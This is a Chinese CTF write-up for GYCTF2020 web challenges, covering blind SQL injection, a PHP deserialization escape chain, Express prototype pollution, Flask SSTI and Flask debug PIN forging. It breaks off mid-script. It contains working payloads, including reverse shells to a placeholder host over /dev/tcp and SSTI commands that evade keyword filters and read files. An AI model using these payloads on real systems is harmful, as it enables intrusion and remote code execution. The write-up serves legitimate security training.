<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">"xxxxxxxxxxxxxxxx"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        temp = flag + chr(j)</span><br><span class="line">        print(temp)</span><br><span class="line">        <span class="comment"># payload = "1^((select 1,concat('&#123;&#125;~', cast(0 as json))) &gt; (select * from f1ag_1s_h3r3_hhhhh))^1".format(temp)</span></span><br><span class="line">        <span class="comment"># payload = "1^((select 1,'&#123;&#125;~') &gt; (select * from f1ag_1s_h3r3_hhhhh))^1".format(temp)</span></span><br><span class="line">        data = &#123;<span class="string">"id"</span>: payload&#125;</span><br><span class="line">        r = s.post(url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Nu1L"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = temp</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>实际上这里因为大写字母的ascii码小于小写字母，而mysql不区分大小写，所以我们这里得到的flag全部为大写字母，如果光是交flag的话，转换成小写字母即可正确。</p>
<p>而预期解实际上是要利用<code>SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON))</code>来让器返回二进制字符串，从而进行大小写的匹配，可以参考这篇文章：<a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">无需in的SQL盲注</a></p>
<p>即将判断条件修改如下：<br><figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">((<span class="name">select</span> <span class="number">1</span>,concat('&#123;&#125;~', cast(<span class="name">0</span> as json))) &gt; (<span class="name">select</span> * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure></p>
<p>这在我本地的测试环境是可以的，但是在BUU上复现的时候却不行，而回显<code>bool(false)</code>，原因还未知…</p>
<h1 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h1><p>存在 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a> 源码泄露，下载下来进行代码审计。</p>
<p>这一题需要了解PHP反序列化的字符逃逸的原理，简单来说就是 <strong>“PHP在进行反序列化的时候，只要前面的字符串符合反序列化的规则并能成功反序列化，那么将忽略后面多余的字符串”</strong> ，关于这个知识点可以去搜索0CTF2016-PiaPiaPia一题的相关Writeup。</p>
<p>下面来看这一道题，首先看一下拿flag的条件，在update.php中：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>只要以 admin 的身份成功登录，就可以返回flag。</p>
<p>重点的代码在lib.php中，首先看一下<code>dbCtr</code>l类：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//lib.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser = <span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass = <span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database = <span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反序列化控制token为admin即可绕过登录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token == <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password) !== $passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>] = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们可以知道登陆成功的条件：① 用户名存在，且<code>$this-&gt;password</code>的md5值与数据库查询的用户密码相同。② 或者token的值为admin。</p>
<p>代码中的查询语句为<code>select id,password from user where username=?</code>,<br>但其实执行的sql语句是我们可控的（后面再说明），这样的话我们只需要将查询语句写成下面这个样子:<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select 1,<span class="string">"c4ca4238a0b923820dcc509a6f75849b"</span> <span class="keyword">from</span><span class="built_in"> user </span>where <span class="attribute">username</span>=?</span><br></pre></td></tr></table></figure></p>
<p>然后再将<code>$this-&gt;password</code>的值赋为1（1的md5值为c4ca4238a0b923820dcc509a6f75849b），即可通过登录密码的验证。</p>
<p>下面的问题就是如何控制执行的sql语句以及<code>$this-&gt;password</code>的值，这就需要用到反序列化了，我们看一下如何构造POP链：</p>
<ul>
<li>在<code>UpdateHelper::__destruct()</code>中看到字符串输出语句，所以只需要将<code>$sql</code>实例化为<code>User</code>类的对象，即可在该类对象结束时，调用到 <code>User::__toString</code>方法<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225122020890.png" alt="在这里插入图片描述"></li>
<li>然后看<code>User::__toString</code>方法，用<code>$nickname</code>变量调用了<code>update()</code>函数，且<code>$age</code>变量作为参数。这样我们只需要将<code>$nicknames</code>实例化为<code>Info</code>类的对象，从而可以调用<code>Info::__call</code>方法，且<code>$age</code>中的值会作为参数传入。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225122808374.png" alt="在这里插入图片描述"></li>
<li>之后我们继续跟进到<code>Info::__call</code>方法，可以看到其用<code>$CtrCase</code>变量调用了<code>login()</code>方法，且参数就是上一步通过<code>User.age</code>的值传进来的。这样我们只需要将这个类里的<code>$CtrlCase</code>变量实例化为<code>dbCtrl</code>类的对象，这句话就相当于调用了<code>dbCtrl::login($sql)</code>，而且参数sql语句也是我们所控制的了，也就达到了我们的目的。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225123203656.png" alt="在这里插入图片描述"></li>
<li>最后我们只需要对<code>dbCtrl</code>类里的一些变量赋值成我们需要的值即可，而且可知<code>dbCtrl::login($sql)</code>中的<code>$sql</code>参数，实际上是<code>User</code>类中<code>$age</code>变量传入的。</li>
</ul>
<p>所以最终的反序列化payload脚本如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="string">'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">"1"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> UpdateHelper;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br></pre></td></tr></table></figure></p>
<p>运行得到如下payload：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">"UpdateHelper"</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">"sql"</span>;O:<span class="number">4</span>:<span class="string">"User"</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"age"</span>;s:<span class="number">70</span>:<span class="string">"select 1,"</span>c4ca4238a0b923820dcc509a6f75849<span class="string">b" from user where username=?"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;O:<span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">"CtrlCase"</span>;O:<span class="number">6</span>:<span class="string">"dbCtrl"</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">1</span>:<span class="string">"1"</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>下面我们就需要思考如何将脚本得到的序列化串被程序反序列化呢？</p>
<p>先找一下反序列化的利用点，从 update.php 可以跟进到<code>User</code>类的<code>update()</code>函数:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$Info = unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());  </span><br><span class="line">	$age = $Info-&gt;age;</span><br><span class="line">	$nickname = $Info-&gt;nickname; </span><br><span class="line">	$updateAction = <span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>], $Info, <span class="string">"update user SET age=$age,nickname=$nickname where id="</span> . $_SESSION[<span class="string">'id'</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到反序列化的是<code>getNewinfo()</code>函数的返回值，跟进这个函数：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $age = $_POST[<span class="string">'age'</span>];</span><br><span class="line">    $nickname = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age, $nickname)));  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个函数的返回值是一个<strong>先序列化</strong>再经过<code>safe()</code>函数处理的<code>Info</code>类对象。</p>
<p>所以最终能够反序列化的不是我们直接传入的字符串，而是用我们传入的值实例化一个<code>Info</code>类的对象，然后对这个对象进行序列化，载对这个序列化结果进行<code>safe()</code> 处理，最后得到的值再进行反序列化。</p>
<p><code>safe()</code>函数如下，如果你了解<strong>反序列化的字符逃逸原理</strong>，那么很容易看出这个函数的问题：将长度小于6的字符串直接替换成了长度为6的hacker。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $array = <span class="keyword">array</span>(<span class="string">'union'</span>, <span class="string">'regexp'</span>, <span class="string">'load'</span>, <span class="string">'into'</span>, <span class="string">'flag'</span>, <span class="string">'file'</span>, <span class="string">'insert'</span>, <span class="string">"'"</span>, <span class="string">'\\'</span>, <span class="string">"*"</span>, <span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array, <span class="string">'hacker'</span>, $parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果我们将刚才得到的payload直接用age或nickname参数传入的化，其实际上只会被当成<code>Info</code>类里的一个很长的字符串，并不能被反序列化得到执行。</p>
<p>所以要想反序列化我们的payload，就得控制<code>Info</code>类对象的序列化串，看一下这个序列化串的格式（假设age为20，nickname为lethe）：<br><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">2</span>:<span class="string">"20"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"lethe"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;N;&#125;</span><br></pre></td></tr></table></figure></p>
<p>我感觉这里原理上有点类似注入，需要闭合构造符合规则的序列化串。</p>
<p>假设我们要通过nickname参数来注入，先看一下我们构造的payload2如下（未逃逸字符串前）：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">";s:8:"CtrlCase";O:12:"UpdateHelper":1:&#123;s:3:"sql";O:4:"User":2:&#123;s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:&#123;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:8:"password";s:1:"1";&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到我们在而已序列化串前加上了<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>，在最后加上了一个<code>}</code>（整个长度为263），这样我们将其作为<code>new Info($age,$nickname)</code>的nickname传入时，序列化的结果如下：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225135058986.png" alt="在这里插入图片描述"><br>上图中两个箭头之间的内容就是我们传入的payload，可以看到我们在第一个箭头那里是想闭合双引号，从而使后面的内容符合序列化的规则的。但是我圈出来的那个263在序列化的规则里，限制了nickname的长度为263，所以后面长度为263的payload还是当作了一个普通字符串，而不是序列化里的内容。</p>
<p>这时候就需要用到字符逃逸的原理了，我们在payload2的前面加上263个<code>union</code>，这样我上面圈出来的值就变成了$263×5+263=1578$，上面第一个箭头所指的双引号里是263个<code>union</code>(长度为$263×5=1315$)，当对这个序列化串进行<code>safe()</code>函数的处理时，所有的<code>union</code>都被替换成了<code>hacker</code>，也就是双引号里的内容变成了263个<code>hacker</code>（长度为$263×6=1578$），正好等于前面的1579，如下：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225140946410.png" alt="在这里插入图片描述"></p>
<p>上面的图可以看出来经过safe()函数处理后，这个序列化串就被解释成了nickname变量长度为1586的重复<code>hacker</code>字符串，而我们的而已序列化payload，则以对象的形式作为CtrCase变量的值。<br>而之所前面构造的时候在最后面加一个<code>}</code>，是因为<code>Info</code>类的对象只有3个变量（第一个箭头所指），当到我们第二个箭头所指的位置时，前面已经有3个变量满足了序列化串的要求了，所以加一个<code>}</code>来闭合整个序列化串。这样由于前面的内容已经符合反序列化的规则，所以后面的内容都将被忽略。</p>
<p>最终payload如下：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">age=1&amp;nickname=";s:8:"CtrlCase";O:12:"UpdateHelper":1:&#123;s:3:"sql";O:4:"User":2:&#123;s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:&#123;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:8:"password";s:1:"1";&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>在update.php以POST传入上面的payload，此时反序列化被执行，在login函数里面已经成功验证了，token被设置为了<code>admin</code>，所以再回到登录界面使用任意密码即可登录admin账户：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225013210183.png" alt="在这里插入图片描述"><br><br></p>
<h1 id="Ez-Expresss"><a href="#Ez-Expresss" class="headerlink" title="Ez_Expresss"></a>Ez_Expresss</h1><p>存在<a href="http://www.zip源码泄露，可以下载得到源码。" target="_blank" rel="noopener">www.zip源码泄露，可以下载得到源码。</a></p>
<p>在登录界面，有如下提示：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305234711800.png" alt><br>这里只支持大写非常的奇怪，查阅资料得到：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305234811798.png" alt="在这里插入图片描述"><br>再查看源码，确实是使用了toUpperCase()进行处理，所以可以利用这个特性来注册<code>admın</code>用户进行绕过：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306000532187.png" alt="在这里插入图片描述"></p>
<p>可以看到成功了，并且提示flag在/flag目录下。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306000712785.png" alt="在这里插入图片描述"></p>
<p>下面就考虑如何读文件或者RCE，再次进行代码审计。</p>
<p>一开始就是熟悉的merge+clone，那么考虑是否存在原型链污染（不熟悉的话可参考p神的：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">深入理解 JavaScript Prototype 污染攻击</a>）<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305235757818.png" alt="在这里插入图片描述"><br>在<code>/action</code>路由下使用了<code>clone()</code>方法：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>这个路由只有ADMIN可以访问，且<code>clone()</code>的参数是我们可控的，所以可以确定原型链污染了。</p>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306001937535.png" alt="在这里插入图片描述"><br>然后在info路由看到了一个莫名其妙又有点眼熟的<code>outputFunctionName</code>，在XNUCA 2019的HardJS考过这个，拼接在ejs渲染引擎中可以RCE，可参考我当时<a href="https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019%E9%83%A8%E5%88%86web%E9%A2%98%E5%A4%8D%E7%8E%B0/#xnuca-2019-hardjs-1">对HardJS的分析文章。</a></p>
<p>所以可以直接改一下当时的payload就好：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"a=1;process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xxx/7777 0&gt;&amp;1\"')//"</span>&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>参考<a href="https://xz.aliyun.com/t/7184#toc-7推荐一个更好一点的命令执行的payload，因为有时候用require会报错：" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184#toc-7推荐一个更好一点的命令执行的payload，因为有时候用require会报错：</a></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"__proto__"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"a=1;global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xxx/7777 0&gt;&amp;1\"')//"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>然后提交<code>/action</code>（即最喜欢的语言）并抓包，然后填入poayload，注意要把Content-Type: 改为plication/json：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306004459451.png" alt="在这里插入图片描述"><br>然后访问<code>/info</code>路由让<code>outputFunctionName</code>拼接到渲染引擎中触发原型链污染，即可得到shell：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306004728516.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="FlaskApp"><a href="#FlaskApp" class="headerlink" title="FlaskApp"></a>FlaskApp</h1><p>进入页面后，是一个Flask写的base64加解密功能，提示路由的源码中提示了<code>PIN</code>，应该是想说Flask的Debug模式中的PIN码。</p>
<p>在Base64解码的功能中很容易使其报错（如输入1）：<img src="/2020/03/06/GYCTF2020-Writeup/20200306170505781.png" alt="在这里插入图片描述"><br>可以看到确实开启了Debug模式，并泄露了decode路由的源码:<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306170602388.png" alt="在这里插入图片描述"><br>解码的结果直接拼接到模板中渲染，存在SSTI漏洞，不过经过了<code>waf</code>的处理，我们也并不知道过滤了什么东西。</p>
<p>那么先试试一下SSTI吧：<br><code>4</code>的base64为<code>e3syKzJ9fQ==</code>，我们进行解码得到4，确认存在SSTI了：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306170927846.png" alt="在这里插入图片描述"></p>
<h4 id="非预期解：利用SSTI进行RCE"><a href="#非预期解：利用SSTI进行RCE" class="headerlink" title="非预期解：利用SSTI进行RCE"></a>非预期解：利用SSTI进行RCE</h4><p>虽然知道出题人的意思是利用PIN码来RCE，不过我还是想试试看能否直接利用SSTI进行RCE。</p>
<p>那么先试试过滤了哪些？</p>
<p>经过测试，SSTI中常用的一些关键词并没有被过滤(毕竟预期解也需要SSTI来读文件~)：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306171543736.png" alt="在这里插入图片描述"><br>而是过滤了<code>system</code>、<code>popen</code>、<code>os</code>、<code>eval</code>、<code>import</code>、<code>flag</code>等RCE需要用到的关键词，但是这个过滤可以使用<strong>拼接字符串</strong>来绕过，这样我们想构造一个payload绕过就并不是很难了：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306172027467.png" alt="在这里插入图片描述"></p>
<p>所以我们要构造的payload一定不是能是<code>xx.popen()</code>的形式，而是要把被过滤的关键词用字符串的方式调用，这样才能利用拼接或者编码来绕过，实际上这样的payload也很常见，网上能搜到很多。并且本题环境中可以用的类也不少，如下面两个payload均可以RCE：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">131</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("o'</span>+<span class="string">'s").po'</span>+<span class="string">'pen("cat /this_is_the_fl'</span>+<span class="string">'ag.txt")'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">'sys'</span>].modules[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'cat /this_is_the_fl'</span>+<span class="string">'ag.txt'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>将payload进行base64编码，再在题目中解码触发SSTI进行RCE：</p>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306172255728.png" alt="在这里插入图片描述"></p>
<h4 id="预期解：利用PIN码进行RCE"><a href="#预期解：利用PIN码进行RCE" class="headerlink" title="预期解：利用PIN码进行RCE"></a>预期解：利用PIN码进行RCE</h4><p>参考这篇文章：<a href="https://www.anquanke.com/post/id/197602" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197602</a></p>
<p>要想生成PIN码，我们需要获得下面几个信息，这里就不考虑RCE了，所需要的信息均可以通过读文件来获得：</p>
<p>（1）服务器运行flask所登录的用户名。通过读取/etc/password可知此值为：<code>flaskweb</code><br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182207863.png" alt="在这里插入图片描述"><br>（2）modname的值。一般不变就是<code>flask.app</code></p>
<p>（3） <code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code>的结果。就是<code>Flask</code>，也不会变</p>
<p>（4）flask库下app.py的绝对路径。在报错信息中可以获取此值为： <code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182459368.png" alt="在这里插入图片描述"><br>（5）当前网络的mac地址的十进制数。通过文件<code>/sys/class/net/eth0/address</code>读取，eth0为当前使用的网卡：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306182704459.png" alt="在这里插入图片描述"><br>将<code>0242ae00ecc2</code>转换为10进制为：<code>2485410393282</code></p>
<p>（6）机器的id。</p>
<ul>
<li>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在<code>/etc/machine-id</code>或<code>/proc/sys/kernel/random/boot_i</code>，有的系统没有这两个文件。</li>
<li>对于docker机则读取<code>/proc/self/cgroup</code>，其中第一行的<code>/docker/</code>字符串后面的内容作为机器的id，如下为<code>1834da85a17efb2029d4a9c8e8f71fe40a96862055c636788c9835665e8e3359</code></li>
</ul>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306183250928.png" alt="在这里插入图片描述"></p>
<p>然后用kingkk师傅的exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485410393282'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span 